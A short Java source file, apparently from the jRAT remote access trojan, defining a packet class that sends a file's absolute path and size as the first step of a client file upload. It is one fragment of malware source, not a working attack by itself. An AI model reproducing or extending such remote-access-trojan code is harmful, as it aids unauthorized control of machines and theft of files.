package jrat.client.packets.outgoing;

import io.jrat.common.io.StringWriter;
import java.io.DataOutputStream;
import java.io.File;

public class Packet30BeginClientUpload extends AbstractOutgoingPacket {
	
	private File file;
	
	public Packet30BeginClientUpload(File file) {
		this.file = file;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(file.getAbsolutePath());
		dos.writeLong(file.length());
	}

	@Override
	public short getPacketId() {
		return (byte) 30;
	}

}
